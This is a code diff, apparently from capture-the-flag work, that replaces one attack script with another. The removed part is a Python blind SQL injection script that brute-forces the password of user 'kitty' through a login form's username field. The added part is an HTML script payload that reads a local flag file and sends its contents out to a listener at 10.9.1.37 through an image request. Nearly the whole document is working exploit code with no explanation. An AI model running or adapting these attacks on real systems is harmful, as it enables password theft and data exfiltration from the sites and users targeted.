@@ -1,36 +1,12 @@
-import sys
-import requests
-
-def sqli(ip):
-    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-/:$^ '
-    tmp = ""
-
-    while True:
-        for i in symbols:
-            post = {
-                "username": f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username=\"kitty\" AND password LIKE BINARY '{tmp+i}%';-- -",
-                "password": "doesntmatter"
-            }
-            req = requests.post(f"http://{ip}/index.php", data=post, allow_redirects=False)
-            status_code = req.status_code
-            print(f"{i}", end='\r')
-            if status_code == 302:
-                tmp += i
-                print(tmp)
-                break
-            elif i == " " :
-                print("\n[#] Attack completed B)")
-                print(f"PASSWORD: {tmp}")
-                exit()
-
-def main():
-    if len(sys.argv) != 2:
-        print("(+) Usage: %s <ip>" % sys.argv[0])
-        print("(+) Example: %s 192.168.0.1" % sys.argv[0])
-        return
-    url = sys.argv[1]
-    print("(+) Retrieving password for user 'kitty'..")
-    sqli(url)
-
-if __name__ == "__main__":
-    main()
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://127.0.0.1:8080/flag.txt', true);
+    xhr.onload = function() {
+        if (xhr.status == 200) {
+            var flagContent = xhr.responseText;
+            var img = new Image();
+            img.src = "http://10.9.1.37:8000/flag?content=" + encodeURIComponent(flagContent);
+        }
+    };
+    xhr.send();
+</script>
